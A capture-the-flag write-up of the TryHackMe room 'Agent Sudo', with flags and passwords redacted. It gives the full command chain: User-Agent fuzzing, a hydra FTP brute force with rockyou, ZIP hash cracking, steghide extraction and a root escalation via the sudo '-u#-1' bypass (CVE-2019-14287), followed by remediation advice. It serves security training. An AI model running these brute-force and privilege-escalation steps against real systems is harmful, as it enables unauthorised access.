# TryHackMe — Agent Sudo

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 18.04) |
| **Date** | 2026-11-25 |
| **Skills** | User-agent fuzzing, FTP brute force, steganography (binwalk, steghide), ZIP cracking (zip2john), sudo `!root` bypass (CVE-2019-14287) |

> Flags and recovered passwords are redacted, following TryHackMe's write-up guidelines.

## Summary

The website only answers properly if your **User-Agent** is an agent's codename (a single letter). Fuzzing A–Z finds a hidden page that names the user **chris** and says his password is weak. Hydra finds it on **FTP**, which holds two images. One has an **encrypted ZIP appended** to it: cracked with zip2john + john, it gives a base64 string, which is the **steghide passphrase** for the other image. That reveals **james**'s SSH password. james can run bash via sudo as any user **except root**, but sudo 1.8.21p2 is vulnerable to **CVE-2019-14287**: asking for user ID `-1` bypasses the rule and gives root.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
nmap -sV -sC -p 21,22,80 -oN services.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.3 | **No** `ftp-anon` line: anonymous login is not allowed |
| 22 | OpenSSH 7.6p1 (Ubuntu) | |
| 80 | Apache 2.4.29 (Ubuntu) | Title: "Annoucement" |

Compared with my previous machines, the missing `ftp-anon` was the first thing to notice: FTP needs credentials, so the web comes first.

## 2. Web — User-Agent fuzzing

The home page:

```
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
```

I didn't know what to do with this at first. The **User-Agent** is an HTTP header the browser sends to say what it is (`Mozilla/5.0 ...`); the server can read it and answer differently, and the client can set it to anything. The note is signed "Agent **R**", so codenames are single letters.

With `R`, the page changes:

```bash
curl -A "R" http://<TARGET>
```

```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

25 employees + R = 26 letters, which confirms the idea. To try them all, a bash loop comparing response sizes:

```bash
for l in {A..Z}; do echo "$l: $(curl -s -A "$l" http://<TARGET> | wc -c)"; done
```

Only `R` stood out (310 bytes vs 218). **But size wasn't enough**: a redirect can carry the same body as the normal page. Checking the **HTTP status code** instead:

```bash
for l in {A..Z}; do echo "$l: $(curl -s -o /dev/null -w '%{http_code}' -A "$l" http://<TARGET>)"; done
```

`C` returned a **302**. `curl` doesn't follow redirects by default, so the first time I only saw the normal page again; `-L` follows it:

```bash
curl -L -A "C" http://<TARGET>
```

```
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!
From,
Agent R
```

A username (`chris`) and a hint that his password is weak.

## 3. FTP brute force

Two services to try: SSH or FTP. My instinct was SSH, but FTP was the better choice:

- Each FTP login is a plain-text exchange; SSH negotiates encryption every time and drops connections when hammered. With rockyou (14 million entries) that matters.
- FTP was open without anonymous access, so someone was meant to log in there.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 16 ftp://<TARGET>
```

**My mistake:** I first wrote `-s 2222`, copied from a previous machine where SSH was on a non-standard port. FTP here is on 21, so `-s` isn't needed.

```
[21][ftp] host: <TARGET>   login: chris   password: <redacted>
```

Found in under a minute. The FTP share:

```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

Downloaded all three at once with `prompt off` + `mget *`. The note:

```
All these alien like photos are fake! Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture.
From,
Agent C
```

## 4. Steganography

Hidden data in images. I went through the usual tools from cheapest to most specific: `file`, `exiftool`, `strings`, `binwalk`, `steghide`.

**My mistake:** I ran several tools on both images in one go and the outputs got mixed. I thought `To_agentR.txt` was inside the JPG, but those `strings` lines came from the PNG. One tool, one file at a time.

The `strings cutie.png` output showed `IEND` (the marker that ends a PNG) **followed by more data** and a filename: something appended after the image. `binwalk` confirms it:

```bash
binwalk cutie.png
```

```
DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

binwalk scans the file for format **signatures** (the magic bytes each format starts with) and reports any file embedded inside another. `binwalk -e` extracts them; the ZIP is named after its offset (`8702.zip`).

### Cracking the ZIP

The ZIP is encrypted. john doesn't work on the file directly, it needs a **hash**; the `*2john` tools extract one for each format:

```bash
zip2john 8702.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked instantly. `unzip` failed (`need PK compat. v5.1`) because the archive uses AES encryption, which it doesn't support; `7z x 8702.zip` opens it:

```
We need to send the picture to '<redacted>' as soon as possible!
```

My first thought was that the string was a password. But mixed case + digits and a length that's a multiple of 4 suggests an **encoding**:

```bash
echo '<redacted>' | base64 -d
```

It decodes to a place name. Base64 is an encoding, not encryption: anyone can read it.

### steghide

One image left, and one tool that takes a passphrase. `steghide` hides data inside the image's pixels (JPG/BMP only):

```bash
steghide info cute-alien.jpg
```

```
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
```

```bash
steghide extract -sf cute-alien.jpg
```

`extract` is the mode; `-sf` only says which file to read from. The message gives **james**'s login password.

## 5. Initial access — SSH as james

```bash
ssh james@<TARGET>
```

`user_flag.txt` is in james's home, next to `Alien_autospy.jpg`. I copied the image to Kali with `scp` (FTP wouldn't work: it logs you in as chris, locked to his folder):

```bash
scp james@<TARGET>:Alien_autospy.jpg .
```

The room asks what incident the photo shows. That's not steganography but OSINT: a reverse image search (Google Lens / TinEye) identifies it as the Roswell alien autopsy footage.

## 6. Privilege escalation — CVE-2019-14287

```bash
sudo -l
```

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

**My mistake:** I read this as "can do everything as root". It's the opposite. The parenthesis says **which users** you can run the binary as: `ALL` = any user, `!root` = **except root**. On paper, this rule exists to stop you from becoming root.

A rule that unusual is a hint to check the sudo version:

```bash
sudo --version
```

```
Sudo version 1.8.21p2
```

```bash
searchsploit sudo
```

Picking the right entry took me three tries, and the mistakes are worth writing down:

| Candidate | Why it's wrong (or right) |
|---|---|
| 52354 (Sudo 1.9.17) | Different, later branch |
| 25134 (sudo 1.8.0 < 1.8.3p1) | Versions compare **number by number**: 1.8.21 is *after* 1.8.3, even though 1.821 < 1.83 as decimals |
| 51217 (sudo 1.8.0 to 1.9.12p1) | Version matches, but it's CVE-2023-22809 and needs a **sudoedit** rule, which I don't have |
| **47502 (sudo 1.8.27 - Security Bypass)** | 1.8.27 is the last affected version (fixed in 1.8.28), and the title matches: bypassing a restriction |

Reading the exploit (`searchsploit -x 47502`) instead of running it shows the trick is a single command:

```bash
sudo -u#-1 /bin/bash
```

- `-u#<number>` runs as the user with that **UID** instead of a name.
- The `!root` check compares the UID against 0. `-1` is not 0, so the rule lets it through.
- But when sudo switches user, `-1` (or its unsigned form, 4294967295) is treated as **0**, which is root.

The check and the action interpret the same number differently.

```
# whoami
root
```

`root.txt` is in `/root` and also answers the bonus question (who Agent R is). Nothing was written to the target, so there was nothing to clean up.

## Attack chain

```
nmap → web: "use your codename as user-agent"
     → fuzz User-Agent A–Z (status codes) → C → 302 → note to chris
     → hydra chris + rockyou on FTP → 2 images + note
     → cutie.png: appended encrypted ZIP → zip2john + john → base64 string
     → steghide on cute-alien.jpg with that passphrase → james's password
     → SSH as james
     → sudo -l = (ALL, !root) /bin/bash + sudo 1.8.21p2
     → sudo -u#-1 /bin/bash (CVE-2019-14287) → root
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Access control based on the User-Agent header | The client controls every header; use real authentication |
| Weak FTP password (in rockyou) | Strong unique passwords; rate-limit or lock out failed logins; prefer SFTP with keys |
| Plain FTP | Credentials and files travel unencrypted; replace with SFTP |
| Credentials hidden in files on a share (stego, base64, a crackable ZIP) | Obscurity is not protection; base64 is not encryption; a ZIP password from rockyou falls in seconds |
| Outdated sudo (1.8.21p2) | Update to 1.8.28 or later |
| `(ALL, !root)` rules | Blacklist rules in sudoers are fragile; grant specific users and specific commands instead |

## Lessons learned

- **Any header the client sends can be forged**, User-Agent included. Fuzz it like any other input.
- **Compare status codes, not just response sizes**: a 302 can have the same size as a 200. And `curl` doesn't follow redirects without `-L`.
- **FTP before SSH for brute force** when both are available: faster and less likely to drop you.
- **One tool, one file at a time.** Mixed outputs made me look in the wrong image.
- **binwalk for appended files, steghide for data hidden in pixels**; john needs a hash first (`zip2john`, `ssh2john`…).
- **Version numbers compare field by field**: 1.8.21 > 1.8.3.
- **Read the exploit before running it.** This one was a single sudo command.
